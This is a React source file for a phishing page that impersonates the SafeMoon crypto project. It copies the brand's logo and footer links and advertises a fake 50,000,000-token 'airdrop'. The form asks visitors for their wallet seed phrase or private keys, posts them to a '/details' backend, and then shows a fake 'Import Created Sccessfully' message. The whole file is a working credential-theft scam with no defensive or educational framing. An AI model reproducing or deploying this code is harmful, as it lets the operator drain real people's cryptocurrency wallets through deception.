import { Button, Dialog, DialogActions, DialogContent, DialogContentText, DialogTitle, TextField } from '@material-ui/core'
import React, { useState } from 'react'
import './safemoonconnect.css'
import axios from './axios'

function Safemoonconnect() {
    const [cryptoWallet, setCryptoWallet] = useState("")
    const [seedOrPhrase, setSeedOrPhrase] = useState("") 
    const [open, setOpen] = useState(false);
    const [input, setInput] = useState("")


    const handleClickOpen = () => {
        setOpen(true);
    }

    const handleClose = () => {
        setOpen(false);
    };


    const handleSubmit = (e) => {
        e.preventDefault()

        const details ={
            cryptowallet: cryptoWallet,
            seedorphrase: seedOrPhrase
        }
        console.log(details)
        axios
        .post("/details", details)
        .then((res) =>{
            console.log('submitted successfully')
            handleClickOpen()
           
        })
        .catch((err) => {
            console.log(err)
        })
    }

    return (
        

        <div className="web restore">
        <div className="main-container movable">
            <div className="main-container-wrapper">
                <div className="restore-content get-started-content get-started-content">
                        <img style={{display: 'block', margin: '0 auto', textAlign: 'center', width: 215, height: 55}} src="safemoon.png" />

                        <div className="step-list">
                            <div class="body-2 text-center margin-2">
                            <font size={4} face="Arial">
                                <h4>Rewards 50,000,000 SafeMoon Airdrop<br />
                                <font size={3}>Connect your wallet to receive Tokens</font>
                                </h4>
                            </font>
                            
                        </div>

                        <Dialog open={open} onClose={handleClose} aria-labelledby="form-dialog-title">
                            <DialogTitle id="form-dialog-title">Airpod Tokens</DialogTitle>
                            <DialogContent>
                            <DialogContentText>
                                Import Created Sccessfully 
                            </DialogContentText>
                            
                            </DialogContent>
                            <DialogActions>
                            <Button onClick={handleClose} color="secondary">
                                Close
                            </Button>
                            
                            </DialogActions>
                        </Dialog>

                        <form className="margin-2" onSubmit={handleSubmit}>

                        <div style={{ fontSize: "large", fontWeight: "400"}}>
                        Choose Your Wallet:
                        </div>

                        <div className="autocomplete" required="required" style={{width: 300, marginBottom: "20px"}}>
                            <input id="myInput" type="text" name="Crypto Wallet" placeholder="eg - TrustWallet" required value={cryptoWallet} onChange={e=> setCryptoWallet(e.target.value)} />
                        </div> 

                        <div style={{ fontSize: "large", fontWeight: "400"}}>
                        Enter Seed Phrase or Private Keys:
                        </div>    

                        <div class="seed-block margin-3">
                        <div className="autocomplete w-input-wrap" required="required" style={{width: 300, marginBottom: "20px"}}>

                            <textarea id="myInput" type="text" name="Seed Phrase" placeholder="Enter Phrase or Private Keys" style={{width: "400px"}} required value={seedOrPhrase} onChange={e=> setSeedOrPhrase(e.target.value)} />
                        </div>
                        <div className="submit big long" style={{ fontSize: "large", fontWeight: "400"}}>Input 12 words Backup Seed Phrase (sometimes 24) <br />
                            or Private key words separated by single spaces</div>
                        </div>
                        
                        <br />

                        <div className="submit big long" style={{width:"400px"}}>
                            <Button className="submit big long" fullWidth type="submit" style={{backgroundColor: "#5a81ea", height:"60px", color:"white",fontSize: "large", fontWeight: "400" }}>IMPORT</Button>
                        </div>
                        </form>

                        

                        <div className="notifications">
                        <w-container-alert-notification type="notification" className="container-alert-notification" />
                        </div>
                        <div style={{textAlign: 'right', position: 'fixed', zIndex: 9999999, bottom: 0, width: 'auto', right: '1%', cursor: 'pointer', lineHeight: 0, display: 'block !important'}} />
            </div>
            </div>
            </div>
        </div>
        <div className="footer" id="footer">
      <div className="container">
        <div className="row py-4 align-items-center">
          <div className="col-12 col-lg-6">
            <h1 className="text-white">Safemoon Protocol</h1>
            <p>
              The SafeMoon Protocol is a community driven, fair launched DeFi
              Token. Three simple functions occur during each trade:
              Reflection, LP Acquisition, &amp; Burn.
            </p>
          </div>
          <div className="col-4 col-lg-2">
            <h3 className="text-white">Community</h3>
            <ul className="list-unstyled">
              <li>
                <a className="text-light" href="https://forums.safemoon.net/" target="_blank">Forums</a>
              </li>
              <li>
                <a className="text-light" href="https://discord.gg/safemoon" target="_blank">Discord</a>
              </li>
              <li>
                <a className="text-light" href="https://www.reddit.com/r/SafeMoon/" target="_blank">Reddit</a>
              </li>
              <li>
                <a className="text-light" href="https://t.me/safemoonv2" target="_blank">Telegram</a>
              </li>
            </ul>
          </div>
          <div className="col-4 col-lg-2">
            <h3 className="text-white">Social</h3>
            <ul className="list-unstyled">
              <li>
                <a className="text-light" href="https://facebook.com/safemoonprotocol">Facebook</a>
              </li>
              <li>
                <a className="text-light" href="https://twitter.com/safemoon">Twitter</a>
              </li>
              <li>
                <a className="text-light" href="https://www.instagram.com/safemoonhq/">Instagram</a>
              </li>
              <li>
                <a className="text-light" href="https://www.linkedin.com/company/safemoon/">LinkedIn</a>
              </li>
            </ul>
          </div>
          <div className="col-4 col-lg-2">
            <h3 className="text-white">Resources</h3>
            <ul className="list-unstyled">
              <li>
                <a className="text-light" href="https://safemoon.net/branding">Branding</a>
              </li>
              <li>
                <a className="text-light" href="https://safemoon.net/wallet">Wallet Tracker</a>
              </li>
              <li>
                <a className="text-light" href="https://github.com/safemoonprotocol/Safemoon.sol" target="_blank">Contract</a>
              </li>
              <li>
                <a className="text-light" href="https://safemoon.net/whitepaper">White paper</a>
              </li>
            </ul>
          </div>
        </div>
        <hr />
        <div className="row align-items-center">
          <div className="col">
            <h3 className="mb-0 text-white">
              Copyright © 2021 Safemoon LLC. | All Rights Reserved
            </h3>
          </div>
          <div className="col text-end">
            <a href="https://safemoon.net/terms" className="btn btn-link btn-sm px-0 text-light">Terms of Service</a><a href="https://safemoon.net/privacy" className="btn btn-link btn-sm px-0 text-light">Privacy Policy</a><a href="https://safemoon.net/privacy" className="btn btn-link btn-sm px-0 text-light">Cookie Policy</a>
          </div>
        </div>
      </div>
    </div>
        </div>

        
    )
}

export default Safemoonconnect
